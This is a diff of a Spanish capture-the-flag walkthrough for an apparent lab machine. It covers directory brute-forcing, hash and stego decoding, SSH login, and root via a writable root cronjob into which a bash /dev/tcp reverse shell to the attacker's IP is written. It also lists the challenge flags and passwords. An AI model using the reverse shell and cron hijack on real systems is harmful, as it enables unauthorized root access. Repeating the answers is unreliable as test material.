@@ -43,7 +43,17 @@ Nmap done: 1 IP address (1 host up) scanned in 85.39 seconds
 ## Task 2
 
 ### Flag1
-```Aqui poner el escaneo con dirb
+```
+gobuster dir -u http://10.10.44.25 -w /home/kali/Downloads/subdomains-top1mil-20000.txt -x html,php,txt -t 50 
+...
+/index.html           (Status: 200) [Size: 612]
+/hidden               (Status: 301) [Size: 169] [--> http://10.10.44.25/hidden/]
+
+$ gobuster dir -u http://10.10.44.25/hidden -w /usr/share/dirb/wordlists/big.txt -x html,php,txt -t 50
+
+/index.html           (Status: 200) [Size: 390]
+/whatever             (Status: 301) [Size: 169] [--> http://10.10.44.25/hidden/whatever/]
+
 ```
 En el directorio --> http://10.10.225.146/hidden/whatever/ click derecho y view page source y hay un hidden con ZmxhZ3tmMXJzN19mbDRnfQ==
 ```
@@ -76,7 +86,13 @@ Copiar el contenido ZmxhZ3tmMXJzN19mbDRnfQ== y usar la web Cyberchef o john en b
 
 ## Flag2
 
-```Dirb http://10.10.225.146:65524/
+```
+gobuster dir -u http://10.10.225.146 -w /usr/share/dirb/wordlists/big.txt -x html,php,txt -t 50
+...
+/hidden               (Status: 301) [Size: 169] [--> http://10.10.225.146/hidden/]
+/index.html           (Status: 200) [Size: 612]
+/robots.txt           (Status: 200) [Size: 43]
+/robots.txt           (Status: 200) [Size: 43]
 ```
 Con la herramietna dirb encontrar un robots.txt --> http://10.10.225.146:65524/robots.txt 
 ```
@@ -134,7 +150,7 @@ Entar en el directorio http://10.10.225.146:65524/n0th1ng3ls3m4tt3r/ y click der
 </html>
 ```
 
-Copiar el contenido de <p> y desencriptar con la web md5hashing.net
+Copiar el contenido de p y desencriptar con la web md5hashing.net
 
 * Respuesta : mypasswordforthatjob
 
@@ -148,11 +164,79 @@ steghide extract -sf Untitled.jpeg  (nombre de la imagen)
 
 Pedirá una contraseña que es la respuesta de la pregunta anterior mypasswordforthatjob. 
 Cat al archivo extraido secrettext.txt , el password usar cyberchef. 
-Conectarse por ssh
 
-```
+* Respuesta : iconvertedmypasswordtobinary
+
+## Conectarse por ssh
+
+User y contraseña en el archivo secrettext.txt
+user : boring
+Contraseña : iconvertedmypasswordtobinary
+
+```bash
 sudo ssh boring@10.10.225.146 -p6498
 ```
+-p6498 por que es el puerto que han puesto que corra el ssh
 
+```
+boring@kral4-PC:~$ ls
+user.txt
+boring@kral4-PC:~$ cat user.txt
+User Flag But It Seems Wrong Like It`s Rotated Or Something
+synt{a0jvgf33zfa0ez4y}
 
+```
+Como la flag a sido rotada  
 
+```bash
+echo "a0jvgf33zfa0ez4y" | tr 'a-z' 'n-za-m'  # ROT13
+```
+
+* Flag user : flag{n0wits33msn0rm4l}
+
+## Root
+Mirar el crontab en busca de cronjobs
+```
+cat /etc/crontab
+```
+```
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root   test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root   test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root   test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
+```
+Hay un cronjob que lo ejecuta el user root --> /var/www/.mysecretcronjob.sh 
+```
+boring@kral4-PC:/$ cd /var/www/
+boring@kral4-PC:/var/www$ ls -la
+total 16
+drwxr-xr-x  3 root   root   4096 Jun 15  2020 .
+drwxr-xr-x 14 root   root   4096 Jun 13  2020 ..
+drwxr-xr-x  4 root   root   4096 Jun 15  2020 html
+-rwxr-xr-x  1 boring boring   33 Jun 14  2020 .mysecretcronjob.sh
+boring@kral4-PC:/var/www$ nano .mysecretcronjob.sh
+
+* Dentro introducir una reverse shell, poner la ip del atacante y un puerto, guardar ctrl + o, cerrar ctrl + x, enter :
+
+#!/bin/bash
+bash -i >& /dev/tcp/TU_IP/4444 0>&1
+
+* Abrir otra terminal y escuchar con : nc -lvnp 4444  y esperar
+
+Una vez estemos conectados con root --> cd /root
+cat .root.txt
+```
+
+* Flag root : flag{63a9f0ea7bb98050796b649e85481845}
